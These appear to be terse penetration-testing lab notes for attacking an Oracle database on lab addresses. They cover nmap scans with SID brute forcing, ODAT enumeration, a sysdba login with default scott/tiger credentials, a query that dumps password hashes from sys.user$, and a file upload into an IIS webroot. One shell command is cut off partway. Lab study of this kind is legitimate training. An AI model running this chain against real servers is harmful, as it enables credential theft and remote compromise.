```
sudo nmap -p1521 -sV 10.129.204.235 --open
```

```
sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
```

```
./odat.py -h

./odat.py all -s 10.129.204.235

sqlplus scott/tiger@10.129.205.19/XE as sysdba
```



> [!NOTE]
> If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below, taken from here.

```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.con
```

select table_name from all_tables;
select * from user_role_privs;
select name, password from sys.user$;




sqlplus scott/tiger@10.129.204.235/XE as sysdba



file upload
```
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt


curl -X GET http://10.129.204.235/testing.txt
```



